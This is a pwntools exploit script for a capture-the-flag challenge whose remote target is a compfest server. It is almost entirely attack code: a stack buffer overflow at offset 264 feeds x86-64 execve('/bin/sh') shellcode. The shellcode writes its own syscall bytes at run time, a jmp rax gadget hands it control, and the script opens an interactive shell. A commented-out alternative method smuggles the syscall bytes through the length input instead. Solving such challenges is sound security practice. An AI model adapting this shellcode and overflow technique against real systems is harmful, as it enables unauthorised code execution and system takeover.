#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chall')
context.terminal = ['wt.exe','wsl.exe']
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("ctf.compfest.id", 7003, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b vuln
b *0x000000000040138d
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        No PIE (0x400000)
# Stack:      Executable
# RWX:        Has RWX segments
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

p = start()

offset = 264

shellcode = asm("""
        xor rax, rax
        push rax
        mov rax, 0x68732f6e69622f2f
        push rax
        mov rdi, rsp      
        xor rsi, rsi      
        xor rdx, rdx      
        mov rax, 59       
        
        
        mov byte ptr [rip + patch_location], 0x0f
        mov byte ptr [rip + patch_location + 1], 0x05
        
        patch_location:
        nop               
        nop
        ret               
    """, arch='amd64')

jmp_rax = 0x40116c
payload = shellcode
payload += b'\x90' * (offset - len(shellcode))
payload += p64(jmp_rax)

p.sendlineafter(b"length: ", str(len(payload)).encode())
p.sendlineafter(b"data: ", payload)
log.success("GOT IT")

# ================ Cara Kedua ==================
# jmp_rax = 0x40116c

# shellcode = asm('''
#      xor rax, rax
#      push rax
#      mov rax, 0x68732f6e69622f2f
#      push rax
#      mov rdi, rsp      
#      xor rsi, rsi      
#      xor rdx, rdx      
#      mov rax, 59  
#     ''')

# payload = shellcode.ljust(offset,b'\x90')
# payload += p64(jmp_rax)

# assert b'\n' not in payload
# p.sendlineafter(b'length: ', str(u32(b'\x0F\x05'.ljust(4, b'\0'))).encode())
# p.sendlineafter(b'data: ', payload)

p.interactive()

